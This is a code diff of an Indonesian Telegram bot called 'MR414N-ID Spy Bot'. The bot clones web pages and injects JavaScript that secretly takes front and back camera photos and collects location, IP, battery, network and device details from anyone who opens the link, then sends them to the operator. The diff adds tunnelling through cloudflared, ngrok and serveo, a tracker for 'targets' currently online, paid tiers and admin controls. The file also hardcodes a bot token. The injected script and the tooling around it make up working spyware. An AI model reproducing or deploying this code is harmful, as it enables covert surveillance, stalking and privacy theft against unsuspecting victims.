@@ -29,9 +29,9 @@ except ImportError:
 #  KONFIGURASI
 # ------------------------------------------------------------------ #
 BOT_TOKEN  = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
-ADMIN_ID   = "8598136412"   # admin pertama — hardcode
+ADMIN_ID   = "8598136412"
 DATA_FILE  = "data.json"
-FREE_LIMIT = 3              # maks link untuk user free
+FREE_LIMIT = 3
 
 # ------------------------------------------------------------------ #
 #  BANNER
@@ -39,7 +39,6 @@ FREE_LIMIT = 3              # maks link untuk user free
 RESET  = "\033[0m"
 BOLD   = "\033[1m"
 COLORS = ["\033[91m","\033[93m","\033[92m","\033[96m","\033[94m","\033[95m"]
-
 ASCII_ART = [
     " __  __ ____  _  _  _  _   _   _       ___ ____  ",
     "|  \\/  |  _ \\| || || || | | | | |     |_ _|  _ \\ ",
@@ -76,18 +75,23 @@ def timer_thread():
 # ------------------------------------------------------------------ #
 _db_lock = threading.Lock()
 
+def db_default():
+    return {
+        "users": {},
+        "admins": [ADMIN_ID],
+        "banned": []
+    }
+
 def db_read() -> dict:
-    """Baca data.json, return dict kosong kalau belum ada."""
     if not os.path.isfile(DATA_FILE):
-        return {"users": {}, "admins": [ADMIN_ID]}
+        return db_default()
     try:
         with open(DATA_FILE, "r", encoding="utf-8") as f:
             return json.load(f)
     except Exception:
-        return {"users": {}, "admins": [ADMIN_ID]}
+        return db_default()
 
 def db_write(data: dict):
-    """Write atomic: tulis ke tmp dulu, rename kalau berhasil."""
     tmp = DATA_FILE + ".tmp"
     with _db_lock:
         try:
@@ -98,14 +102,14 @@ def db_write(data: dict):
             print(f"\n[!] db_write error: {e}")
 
 def db_ensure_user(uid: str):
-    """Pastikan user ada di JSON. Kalau belum, daftarkan sebagai free."""
     data = db_read()
     if uid not in data["users"]:
+        role = "admin" if uid in data.get("admins", []) else "free"
         data["users"][uid] = {
-            "role": "admin" if uid in data.get("admins", []) else "free",
+            "role": role,
             "cap_total": 0,
-            "links_ever": [],
-            "joined": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
+            "joined": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
+            "premium_until": None
         }
         db_write(data)
 
@@ -113,23 +117,58 @@ def db_get_role(uid: str) -> str:
     data = db_read()
     if uid in data.get("admins", []):
         return "admin"
-    return data["users"].get(uid, {}).get("role", "free")
+    u = data["users"].get(uid, {})
+    # cek expired premium
+    role = u.get("role", "free")
+    if role == "premium":
+        until = u.get("premium_until")
+        if until:
+            exp = datetime.datetime.strptime(until, "%Y-%m-%d")
+            if datetime.datetime.now() > exp:
+                db_set_role(uid, "free")
+                return "free"
+    return role
 
-def db_get_link_count(uid: str) -> int:
-    """Hitung link aktif milik user (dari state runtime)."""
-    return sum(1 for lnk in _links if str(lnk["owner"]) == uid)
-
-def db_upgrade_user(uid: str):
+def db_set_role(uid: str, role: str, until: str = None):
     data = db_read()
     if uid in data["users"]:
-        data["users"][uid]["role"] = "premium"
+        data["users"][uid]["role"] = role
+        data["users"][uid]["premium_until"] = until
         db_write(data)
 
-def db_downgrade_user(uid: str):
+def db_ban(uid: str):
     data = db_read()
-    if uid in data["users"]:
-        data["users"][uid]["role"] = "free"
+    if uid not in data.get("banned", []):
+        data.setdefault("banned", []).append(uid)
         db_write(data)
+
+def db_unban(uid: str):
+    data = db_read()
+    if uid in data.get("banned", []):
+        data["banned"].remove(uid)
+        db_write(data)
+
+def db_is_banned(uid: str) -> bool:
+    return uid in db_read().get("banned", [])
+
+def db_add_admin(uid: str):
+    data = db_read()
+    if uid not in data.get("admins", []):
+        data.setdefault("admins", []).append(uid)
+        if uid in data["users"]:
+            data["users"][uid]["role"] = "admin"
+        db_write(data)
+
+def db_remove_admin(uid: str):
+    if uid == ADMIN_ID:
+        return False
+    data = db_read()
+    if uid in data.get("admins", []):
+        data["admins"].remove(uid)
+        if uid in data["users"]:
+            data["users"][uid]["role"] = "free"
+        db_write(data)
+    return True
 
 def db_increment_cap(uid: str):
     data = db_read()
@@ -140,26 +179,62 @@ def db_increment_cap(uid: str):
 def db_all_users() -> dict:
     return db_read().get("users", {})
 
+def db_link_count(uid: str) -> int:
+    return sum(1 for l in _links if str(l["owner"]) == uid)
+
+def db_get_stats() -> dict:
+    data = db_read()
+    users = data.get("users", {})
+    total_cap = sum(u.get("cap_total", 0) for u in users.values())
+    roles = {"admin": 0, "premium": 0, "free": 0}
+    for u in users.values():
+        r = u.get("role", "free")
+        roles[r] = roles.get(r, 0) + 1
+    return {
+        "total_users": len(users),
+        "total_links": len(_links),
+        "total_cap": total_cap,
+        "roles": roles
+    }
+
+# ------------------------------------------------------------------ #
+#  ACTIVE TARGETS — deteksi online
+# ------------------------------------------------------------------ #
+_active_targets = {}  # link_id -> { ip -> last_seen }
+
+def mark_active(link_id, ip):
+    if link_id not in _active_targets:
+        _active_targets[link_id] = {}
+    _active_targets[link_id][ip] = time.time()
+
+def get_online_count():
+    now = time.time()
+    total = 0
+    for link_id, targets in _active_targets.items():
+        for ip, ts in targets.items():
+            if now - ts < 15:
+                total += 1
+    return total
+
 # ------------------------------------------------------------------ #
 #  JS INJECT
 # ------------------------------------------------------------------ #
 INJECT_JS = """
 <script>
 (function(){
-  var capCount = 0;
-  var active   = true;
+  var capCount=0, active=true;
 
-  function snapCamera(facingMode, cb) {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { cb(null); return; }
-    navigator.mediaDevices.getUserMedia({ video:{facingMode:{ideal:facingMode}}, audio:false })
+  function snapCamera(facingMode,cb){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb(null);return;}
+    navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}},audio:false})
     .then(function(stream){
-      var v = document.createElement('video');
-      v.srcObject=stream; v.setAttribute('playsinline',''); v.muted=true; v.play();
+      var v=document.createElement('video');
+      v.srcObject=stream;v.setAttribute('playsinline','');v.muted=true;v.play();
       var fired=false;
       function grab(){
-        if(fired)return; fired=true;
+        if(fired)return;fired=true;
         var c=document.createElement('canvas');
-        c.width=v.videoWidth||640; c.height=v.videoHeight||480;
+        c.width=v.videoWidth||640;c.height=v.videoHeight||480;
         c.getContext('2d').drawImage(v,0,0);
         stream.getTracks().forEach(function(t){t.stop();});
         cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);
@@ -178,10 +253,11 @@ INJECT_JS = """
     );
   }
 
-  function getNetworkInfo(){
+  function getNetworkInfo(cb){
     var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-    if(!c)return{type:'unknown',effectiveType:'unknown'};
-    return{type:c.type||'unknown',effectiveType:c.effectiveType||'unknown'};
+    var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};
+    if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}
+    cb(info);
   }
 
   function getBattery(cb){
@@ -200,19 +276,20 @@ INJECT_JS = """
       language:navigator.language||'unknown',
       timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',
       screen:window.screen.width+'x'+window.screen.height,
-      network:getNetworkInfo(),
-      battery_pct:null,charging:null,ip:null
+      network:null,battery_pct:null,charging:null,ip:null
     };
-    getBattery(function(pct,chrg){
-      info.battery_pct=pct; info.charging=chrg;
-      getPublicIP(function(ip){info.ip=ip; cb(info);});
+    getNetworkInfo(function(net){
+      info.network=net;
+      getBattery(function(pct,chrg){
+        info.battery_pct=pct;info.charging=chrg;
+        getPublicIP(function(ip){info.ip=ip;cb(info);});
+      });
     });
   }
 
   function doCapture(isFirst){
     if(!active)return;
-    capCount++;
-    var num=capCount;
+    capCount++;var num=capCount;
     snapCamera('environment',function(back){
       snapCamera('user',function(front){
         var payload={num:num,photo_front:front||null,photo_back:back||null,
@@ -232,8 +309,12 @@ INJECT_JS = """
                       body:JSON.stringify(payload)}).catch(function(){});
   }
 
+  setInterval(function(){
+    fetch('/ping',{method:'POST'}).catch(function(){});
+  },8000);
+
   window.addEventListener('beforeunload',function(){
-    active=false; navigator.sendBeacon('/offline','{}');
+    active=false;navigator.sendBeacon('/offline','{}');
   });
 
   function loop(){
@@ -252,54 +333,94 @@ INJECT_JS = """
 # ------------------------------------------------------------------ #
 #  STATE RUNTIME
 # ------------------------------------------------------------------ #
-_links       = []   # {id, owner, pub_url, port, proc}
+_links       = []
 _link_id_ctr = 0
-_cap_counts  = {}   # link_id -> count
-_page_htmls  = {}   # link_id -> html
-
-# state per user
-_user_state  = {}   # uid -> state string
-_user_data   = {}   # uid -> temp dict
+_cap_counts  = {}
+_page_htmls  = {}
+_user_state  = {}
+_user_data   = {}
 
 # ------------------------------------------------------------------ #
-#  HELPER
+#  HELPER — parse device lengkap
 # ------------------------------------------------------------------ #
-def free_port(start=8080):
-    p = start
-    while True:
-        with socket.socket() as s:
-            if s.connect_ex(("127.0.0.1",p))!=0: return p
-            p+=1
+def parse_device(ua: str):
+    ua = ua or ""
 
-def clone_url(url):
-    h={"User-Agent":"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"}
-    r=req_lib.get(url,headers=h,timeout=15); r.raise_for_status(); return r.text
+    # Merek & Model
+    brand, model = "Unknown", "Unknown"
+    brand_patterns = [
+        (r"SM-([A-Z0-9]+)", "Samsung", r"SM-[A-Z0-9]+"),
+        (r"Redmi ([^\s;)]+)", "Xiaomi Redmi", r"Redmi [^\s;)]+"),
+        (r"POCO ([^\s;)]+)", "Xiaomi POCO", r"POCO [^\s;)]+"),
+        (r"Mi ([^\s;)]+)", "Xiaomi Mi", r"Mi [^\s;)]+"),
+        (r"CPH([0-9]+)", "OPPO", r"CPH[0-9]+"),
+        (r"RMX([0-9]+)", "Realme", r"RMX[0-9]+"),
+        (r"V([0-9]{4}[A-Z]+)", "Vivo", r"V[0-9]{4}[A-Z]+"),
+        (r"ASUS_([^\s;)]+)", "ASUS", r"ASUS_[^\s;)]+"),
+        (r"Pixel ([^\s;)]+)", "Google Pixel", r"Pixel [^\s;)]+"),
+        (r"OnePlus ([^\s;)]+)", "OnePlus", r"OnePlus [^\s;)]+"),
+        (r"Huawei ([^\s;)]+)", "Huawei", r"Huawei [^\s;)]+"),
+        (r"Nokia ([^\s;)]+)", "Nokia", r"Nokia [^\s;)]+"),
+        (r"LG-([^\s;)]+)", "LG", r"LG-[^\s;)]+"),
+    ]
+    for pattern, b, full_pat in brand_patterns:
+        m = re.search(pattern, ua)
+        if m:
+            brand = b
+            mf = re.search(full_pat, ua)
+            model = mf.group(0) if mf else m.group(0)
+            break
 
-def inject_html(html):
-    idx=html.lower().rfind("</body>")
-    return (html[:idx]+INJECT_JS+html[idx:]) if idx!=-1 else html+INJECT_JS
+    # iPhone / iPad
+    if "iPhone" in ua:
+        brand = "Apple"; model = "iPhone"
+    elif "iPad" in ua:
+        brand = "Apple"; model = "iPad"
 
-def parse_ua(ua):
-    ua=ua or ""
+    # OS
     if "Android" in ua:
-        m=re.search(r"Android ([0-9.]+)",ua); os_n="Android "+(m.group(1) if m else "")
-    elif "iPhone" in ua or "iPad" in ua:
-        m=re.search(r"OS ([0-9_]+)",ua); os_n="iOS "+(m.group(1).replace("_",".") if m else "")
-    elif "Windows" in ua: os_n="Windows"
-    elif "Mac OS" in ua: os_n="macOS"
-    elif "Linux" in ua: os_n="Linux"
-    else: os_n="Unknown"
-    if "Chrome" in ua and "Edg" not in ua and "OPR" not in ua:
-        m=re.search(r"Chrome/([0-9]+)",ua); br="Chrome "+(m.group(1) if m else "")
+        m = re.search(r"Android ([0-9.]+)", ua)
+        os_ver = "Android " + (m.group(1) if m else "?")
+    elif "iPhone OS" in ua or "CPU OS" in ua:
+        m = re.search(r"OS ([0-9_]+)", ua)
+        os_ver = "iOS " + (m.group(1).replace("_", ".") if m else "?")
+    elif "Windows NT" in ua:
+        nt = {"10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7"}
+        m = re.search(r"Windows NT ([0-9.]+)", ua)
+        ver = nt.get(m.group(1), m.group(1)) if m else "?"
+        os_ver = f"Windows {ver}"
+    elif "Mac OS X" in ua:
+        m = re.search(r"Mac OS X ([0-9_]+)", ua)
+        os_ver = "macOS " + (m.group(1).replace("_", ".") if m else "?")
+    elif "Linux" in ua:
+        os_ver = "Linux"
+    else:
+        os_ver = "Unknown OS"
+
+    # Browser
+    if "CriOS" in ua:
+        m = re.search(r"CriOS/([0-9]+)", ua); br = "Chrome iOS " + (m.group(1) if m else "")
+    elif "FxiOS" in ua:
+        m = re.search(r"FxiOS/([0-9]+)", ua); br = "Firefox iOS " + (m.group(1) if m else "")
+    elif "EdgA" in ua:
+        m = re.search(r"EdgA/([0-9]+)", ua); br = "Edge Mobile " + (m.group(1) if m else "")
+    elif "Chrome" in ua and "Edg" not in ua and "OPR" not in ua:
+        m = re.search(r"Chrome/([0-9]+)", ua); br = "Chrome " + (m.group(1) if m else "")
     elif "Firefox" in ua:
-        m=re.search(r"Firefox/([0-9]+)",ua); br="Firefox "+(m.group(1) if m else "")
+        m = re.search(r"Firefox/([0-9]+)", ua); br = "Firefox " + (m.group(1) if m else "")
     elif "Safari" in ua and "Chrome" not in ua:
-        m=re.search(r"Version/([0-9]+)",ua); br="Safari "+(m.group(1) if m else "")
-    elif "Edg" in ua:
-        m=re.search(r"Edg/([0-9]+)",ua); br="Edge "+(m.group(1) if m else "")
-    else: br="Unknown"
-    dev="Mobile" if ("Mobile" in ua or "Android" in ua or "iPhone" in ua) else "Desktop"
-    return os_n, br, dev
+        m = re.search(r"Version/([0-9]+)", ua); br = "Safari " + (m.group(1) if m else "")
+    elif "Edg/" in ua:
+        m = re.search(r"Edg/([0-9]+)", ua); br = "Edge " + (m.group(1) if m else "")
+    elif "OPR" in ua:
+        m = re.search(r"OPR/([0-9]+)", ua); br = "Opera " + (m.group(1) if m else "")
+    elif "UCBrowser" in ua:
+        br = "UC Browser"
+    else:
+        br = "Unknown Browser"
+
+    dev_type = "Mobile" if any(x in ua for x in ["Mobile","Android","iPhone","iPad"]) else "Desktop"
+    return brand, model, os_ver, br, dev_type
 
 # ------------------------------------------------------------------ #
 #  KIRIM HASIL KE TELEGRAM
@@ -309,13 +430,13 @@ def send_result_thread(data, link_id, owner_uid):
 
 async def _send_result(data, link_id, owner_uid):
     bot   = Bot(token=BOT_TOKEN)
-    num   = data.get("num","?")
-    lat   = data.get("lat"); lon=data.get("lon"); acc=data.get("acc")
-    front = data.get("photo_front"); back=data.get("photo_back")
+    num   = data.get("num", "?")
+    lat   = data.get("lat"); lon = data.get("lon"); acc = data.get("acc")
+    front = data.get("photo_front"); back = data.get("photo_back")
     info  = data.get("info") or {}
     ts    = datetime.datetime.now().strftime("%H:%M:%S")
 
-    _cap_counts[link_id] = _cap_counts.get(link_id,0)+1
+    _cap_counts[link_id] = _cap_counts.get(link_id, 0) + 1
     total = _cap_counts[link_id]
     db_increment_cap(owner_uid)
 
@@ -326,11 +447,14 @@ async def _send_result(data, link_id, owner_uid):
             parse_mode="Markdown"
         )
 
-    os_n, br, dev = parse_ua(info.get("userAgent",""))
+    brand, model, os_ver, br, dev_type = parse_device(info.get("userAgent", ""))
     net  = info.get("network") or {}
     batt = info.get("battery_pct")
     chrg = info.get("charging")
     batt_str = f"{batt}% {'🔌' if chrg else '🔋'}" if batt is not None else "?"
+    ntype = net.get("type", "?"); neff = net.get("effectiveType", "?")
+    ndl   = net.get("downlink", "?")
+    net_str = f"{ntype} · {neff} · {ndl} Mbps" if ntype != "unknown" else f"{neff} · {ndl} Mbps"
 
     teks  = f"📸 *Capture #{num}* (Link #{link_id}) — {ts}\n"
     teks += f"📊 Total capture link ini: {total}\n\n"
@@ -339,10 +463,13 @@ async def _send_result(data, link_id, owner_uid):
         teks += f"📍 `{lat}, {lon}` ± {int(float(acc))}m\n[Buka Maps]({maps})\n\n"
     else:
         teks += "📍 Lokasi tidak didapat\n\n"
-    teks += f"📱 *Device:* {dev} — {os_n}\n"
+    teks += f"📱 *Merek:* {brand}\n"
+    teks += f"📲 *Model:* {model}\n"
+    teks += f"💻 *Tipe:* {dev_type}\n"
+    teks += f"🖥 *OS:* {os_ver}\n"
     teks += f"🌐 *Browser:* {br}\n"
     teks += f"🔌 *IP:* `{info.get('ip','?')}`\n"
-    teks += f"📡 *Network:* {net.get('type','?')} ({net.get('effectiveType','?')})\n"
+    teks += f"📡 *Jaringan:* {net_str}\n"
     teks += f"🔋 *Battery:* {batt_str}\n"
     teks += f"🕐 *Timezone:* {info.get('timezone','?')}\n"
     teks += f"🗣 *Bahasa:* {info.get('language','?')}\n"
@@ -350,7 +477,7 @@ async def _send_result(data, link_id, owner_uid):
 
     await bot.send_message(chat_id=owner_uid, text=teks, parse_mode="Markdown")
 
-    if num==1 and lat and lon:
+    if num == 1 and lat and lon:
         await bot.send_location(chat_id=owner_uid,
                                 latitude=float(lat), longitude=float(lon))
     if back:
@@ -368,7 +495,7 @@ async def _send_result(data, link_id, owner_uid):
 
 async def _send_offline(link_id, owner_uid):
     bot = Bot(token=BOT_TOKEN)
-    total = _cap_counts.get(link_id,0)
+    total = _cap_counts.get(link_id, 0)
     await bot.send_message(
         chat_id=owner_uid,
         text=f"🔴 *Target offline* (Link #{link_id})\nTotal capture: {total}",
@@ -382,19 +509,26 @@ def make_flask_app(link_id, owner_uid):
     fapp = Flask(f"app_{link_id}")
 
     @fapp.route("/")
-    def index(): return _page_htmls.get(link_id,"<h1>Not found</h1>")
+    def index(): return _page_htmls.get(link_id, "<h1>Not found</h1>")
 
     @fapp.route("/capture", methods=["POST"])
     def capture():
         data = freq.get_json(silent=True) or {}
+        ip   = freq.remote_addr
+        mark_active(link_id, ip)
         threading.Thread(target=send_result_thread,
-                         args=(data,link_id,owner_uid), daemon=True).start()
-        return jsonify({"ok":True})
+                         args=(data, link_id, owner_uid), daemon=True).start()
+        return jsonify({"ok": True})
+
+    @fapp.route("/ping", methods=["POST"])
+    def ping():
+        mark_active(link_id, freq.remote_addr)
+        return jsonify({"ok": True})
 
     @fapp.route("/offline", methods=["POST"])
     def offline():
         asyncio.run(_send_offline(link_id, owner_uid))
-        return jsonify({"ok":True})
+        return jsonify({"ok": True})
 
     return fapp
 
@@ -405,60 +539,60 @@ def run_flask_on_port(fapp, port):
 #  TUNNEL
 # ------------------------------------------------------------------ #
 def start_cloudflared(port):
-    b=shutil.which("cloudflared")
-    if not b: return None,None
-    proc=subprocess.Popen([b,"tunnel","--url",f"http://localhost:{port}"],
-                          stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
-    pat=re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
+    b = shutil.which("cloudflared")
+    if not b: return None, None
+    proc = subprocess.Popen([b,"tunnel","--url",f"http://localhost:{port}"],
+                            stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
+    pat = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
     for _ in range(40):
-        line=proc.stdout.readline()
+        line = proc.stdout.readline()
         if not line: time.sleep(0.5); continue
-        m=pat.search(line)
-        if m: return m.group(0),proc
-    proc.terminate(); return None,None
+        m = pat.search(line)
+        if m: return m.group(0), proc
+    proc.terminate(); return None, None
 
 def start_ngrok(port):
     if PYNGROK:
         try:
-            t=_ngrok.connect(port,"http")
-            return t.public_url.replace("http://","https://"),None
+            t = _ngrok.connect(port,"http")
+            return t.public_url.replace("http://","https://"), None
         except Exception as e: print(f"\n[!] ngrok: {e}")
     if shutil.which("ngrok"):
-        proc=subprocess.Popen(["ngrok","http",str(port)],
-                              stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(["ngrok","http",str(port)],
+                                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
         time.sleep(3)
         try:
-            r=req_lib.get("http://127.0.0.1:4040/api/tunnels",timeout=3)
+            r = req_lib.get("http://127.0.0.1:4040/api/tunnels",timeout=3)
             for t in r.json().get("tunnels",[]):
-                u=t.get("public_url","")
-                if u.startswith("https"): return u,proc
+                u = t.get("public_url","")
+                if u.startswith("https"): return u, proc
         except: pass
-    return None,None
+    return None, None
 
 def start_serveo(port):
-    if not shutil.which("ssh"): return None,None
-    proc=subprocess.Popen(
+    if not shutil.which("ssh"): return None, None
+    proc = subprocess.Popen(
         ["ssh","-o","StrictHostKeyChecking=no","-o","ServerAliveInterval=30",
          "-R",f"80:localhost:{port}","serveo.net"],
         stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
-    pat=re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
+    pat = re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
     for _ in range(30):
-        line=proc.stdout.readline()
+        line = proc.stdout.readline()
         if not line: time.sleep(0.5); continue
-        m=pat.search(line)
-        if m: return m.group(0),proc
-    proc.terminate(); return None,None
+        m = pat.search(line)
+        if m: return m.group(0), proc
+    proc.terminate(); return None, None
 
-TUNNEL_FN={"cf":start_cloudflared,"ng":start_ngrok,"sv":start_serveo}
+TUNNEL_FN = {"cf": start_cloudflared, "ng": start_ngrok, "sv": start_serveo}
 
 # ------------------------------------------------------------------ #
 #  SPAWN LINK
 # ------------------------------------------------------------------ #
 async def spawn_link(tunnel_key, raw_html, owner_uid, query):
     global _link_id_ctr
-    _link_id_ctr+=1
+    _link_id_ctr += 1
     lid  = _link_id_ctr
-    port = free_port(8080+lid*10)
+    port = free_port(8080 + lid * 10)
 
     _page_htmls[lid] = inject_html(raw_html)
     _cap_counts[lid] = 0
@@ -469,8 +603,8 @@ async def spawn_link(tunnel_key, raw_html, owner_uid, query):
     threading.Thread(target=run_flask_on_port,args=(fapp,port),daemon=True).start()
     time.sleep(1.0)
 
-    loop=asyncio.get_event_loop()
-    pub_url,proc=await loop.run_in_executor(None,TUNNEL_FN[tunnel_key],port)
+    loop = asyncio.get_event_loop()
+    pub_url, proc = await loop.run_in_executor(None, TUNNEL_FN[tunnel_key], port)
 
     if not pub_url:
         await query.edit_message_text("❌ Tunnel gagal.",reply_markup=kb_main(owner_uid))
@@ -483,24 +617,37 @@ async def spawn_link(tunnel_key, raw_html, owner_uid, query):
         parse_mode="Markdown", reply_markup=kb_main(owner_uid)
     )
 
+def inject_html(html):
+    idx = html.lower().rfind("</body>")
+    return (html[:idx]+INJECT_JS+html[idx:]) if idx!=-1 else html+INJECT_JS
+
+def free_port(start=8080):
+    p = start
+    while True:
+        with socket.socket() as s:
+            if s.connect_ex(("127.0.0.1",p))!=0: return p
+            p+=1
+
+def clone_url(url):
+    h={"User-Agent":"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"}
+    r=req_lib.get(url,headers=h,timeout=15); r.raise_for_status(); return r.text
+
 # ------------------------------------------------------------------ #
 #  KEYBOARD
 # ------------------------------------------------------------------ #
 def kb_main(uid):
-    role = db_get_role(uid)
-    rows = [
+    return InlineKeyboardMarkup([
         [
             InlineKeyboardButton("➕ Tambah Link", callback_data="add_link"),
             InlineKeyboardButton("🗑 Hapus Link",  callback_data="del_link"),
         ],
         [
-            InlineKeyboardButton("📋 Daftar Link", callback_data="list_links"),
-            InlineKeyboardButton("🛑 Stop Server", callback_data="stop"),
+            InlineKeyboardButton("📋 Daftar Link",  callback_data="list_links"),
+            InlineKeyboardButton("👁 Target Online", callback_data="online_now"),
         ],
-    ]
-    if role == "admin":
-        rows.append([InlineKeyboardButton("👑 Panel Admin", callback_data="admin_panel")])
-    return InlineKeyboardMarkup(rows)
+        [InlineKeyboardButton("👑 Panel Admin", callback_data="admin_panel")]
+        if db_get_role(uid) == "admin" else []
+    ])
 
 def kb_template():
     return InlineKeyboardMarkup([
@@ -513,18 +660,16 @@ def kb_template():
 
 def kb_tunnel():
     return InlineKeyboardMarkup([[
-        InlineKeyboardButton("☁ Cloudflared", callback_data="tun_cf"),
+        InlineKeyboardButton("☁️ Cloudflared", callback_data="tun_cf"),
         InlineKeyboardButton("🔗 Ngrok",       callback_data="tun_ng"),
         InlineKeyboardButton("🌐 Serveo",      callback_data="tun_sv"),
-    ],[
-        InlineKeyboardButton("« Kembali", callback_data="back_main"),
-    ]])
+    ],[InlineKeyboardButton("« Kembali", callback_data="back_main")]])
 
 def kb_del(uid):
-    rows=[]
+    rows = []
     for lnk in _links:
-        if str(lnk["owner"])==uid:
-            cap=_cap_counts.get(lnk["id"],0)
+        if str(lnk["owner"]) == uid:
+            cap = _cap_counts.get(lnk["id"],0)
             rows.append([InlineKeyboardButton(
                 f"🗑 Link #{lnk['id']} ({cap} cap) — {lnk['pub_url'][:30]}...",
                 callback_data=f"delid_{lnk['id']}"
@@ -535,40 +680,63 @@ def kb_del(uid):
 def kb_admin():
     return InlineKeyboardMarkup([
         [
-            InlineKeyboardButton("⬆ Upgrade User",   callback_data="admin_upgrade"),
-            InlineKeyboardButton("⬇ Downgrade User", callback_data="admin_downgrade"),
+            InlineKeyboardButton("⬆️ Upgrade User",    callback_data="a_upgrade"),
+            InlineKeyboardButton("⬇️ Downgrade User",  callback_data="a_downgrade"),
         ],
         [
-            InlineKeyboardButton("👥 Lihat Semua User", callback_data="admin_users"),
+            InlineKeyboardButton("🚫 Ban User",         callback_data="a_ban"),
+            InlineKeyboardButton("✅ Unban User",        callback_data="a_unban"),
         ],
-        [InlineKeyboardButton("« Kembali", callback_data="back_main")],
+        [
+            InlineKeyboardButton("➕ Tambah Admin",     callback_data="a_addadmin"),
+            InlineKeyboardButton("➖ Hapus Admin",      callback_data="a_deladmin"),
+        ],
+        [
+            InlineKeyboardButton("👥 Semua User",       callback_data="a_users"),
+            InlineKeyboardButton("📊 Statistik",        callback_data="a_stats"),
+        ],
+        [
+            InlineKeyboardButton("🔗 Semua Link Aktif", callback_data="a_alllinks"),
+            InlineKeyboardButton("❌ Force Hapus Link", callback_data="a_forcelink"),
+        ],
+        [
+            InlineKeyboardButton("💬 Pesan ke User",    callback_data="a_msg"),
+            InlineKeyboardButton("📢 Broadcast",        callback_data="a_broadcast"),
+        ],
+        [
+            InlineKeyboardButton("⏳ Set Premium Exp",  callback_data="a_setexp"),
+            InlineKeyboardButton("📝 Detail User",      callback_data="a_detail"),
+        ],
+        [
+            InlineKeyboardButton("🛑 Stop Server",      callback_data="a_stop"),
+            InlineKeyboardButton("« Kembali",           callback_data="back_main"),
+        ],
     ])
 
 # ------------------------------------------------------------------ #
 #  HANDLERS
 # ------------------------------------------------------------------ #
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid  = str(update.effective_user.id)
+    uid = str(update.effective_user.id)
+
+    if db_is_banned(uid):
+        await update.message.reply_text("🚫 Kamu telah dibanned dari bot ini.")
+        return
+
     db_ensure_user(uid)
-    role = db_get_role(uid)
-
-    badge = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
+    role  = db_get_role(uid)
     cap   = db_read()["users"].get(uid,{}).get("cap_total",0)
+    badge = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
 
-    teks  = f"🕵 *MR414N-ID Spy Bot*\n\n"
-    teks += f"Status: {badge}\n"
-    teks += f"Total capture: {cap}\n"
-
+    teks  = f"🕵️ *MR414N-ID Spy Bot*\n\n"
+    teks += f"Status: {badge}\nTotal capture: {cap}\n"
     if role == "free":
-        aktif = db_get_link_count(uid)
-        teks += f"Link aktif: {aktif}/{FREE_LIMIT}\n"
-
+        teks += f"Link aktif: {db_link_count(uid)}/{FREE_LIMIT}\n"
     teks += "\nPanel kontrol:"
 
     _user_state[uid] = None
     _user_data[uid]  = {}
-
-    await update.message.reply_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))
+    await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))
 
 async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q   = update.callback_query
@@ -576,52 +744,69 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     d   = q.data
     await q.answer()
 
+    if db_is_banned(uid):
+        await q.answer("🚫 Kamu telah dibanned.",show_alert=True); return
+
     role = db_get_role(uid)
 
+    # --- back ---
     if d == "back_main":
         _user_state[uid]=None; _user_data[uid]={}
-        cap  = db_read()["users"].get(uid,{}).get("cap_total",0)
-        badge= {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
-        teks = f"🕵 *MR414N-ID Spy Bot*\n\nStatus: {badge}\nTotal capture: {cap}\n\nPanel kontrol:"
+        cap   = db_read()["users"].get(uid,{}).get("cap_total",0)
+        badge = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
+        teks  = f"🕵️ *MR414N-ID Spy Bot*\n\nStatus: {badge}\nTotal capture: {cap}\n\nPanel kontrol:"
         await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))
 
+    # --- tambah link ---
     elif d == "add_link":
-        # cek batas free
-        if role == "free":
-            aktif = db_get_link_count(uid)
-            if aktif >= FREE_LIMIT:
-                await q.answer(f"❌ Batas {FREE_LIMIT} link untuk Free. Minta Admin upgrade.",show_alert=True)
-                return
+        if role == "free" and db_link_count(uid) >= FREE_LIMIT:
+            await q.answer(f"❌ Batas {FREE_LIMIT} link untuk Free.",show_alert=True); return
         _user_state[uid]="await_template"; _user_data[uid]={}
-        await q.edit_message_text("Pilih template untuk link baru:",reply_markup=kb_template())
+        await q.edit_message_text("Pilih template:",reply_markup=kb_template())
 
     elif d == "tmpl_url":
         _user_state[uid]="await_url"
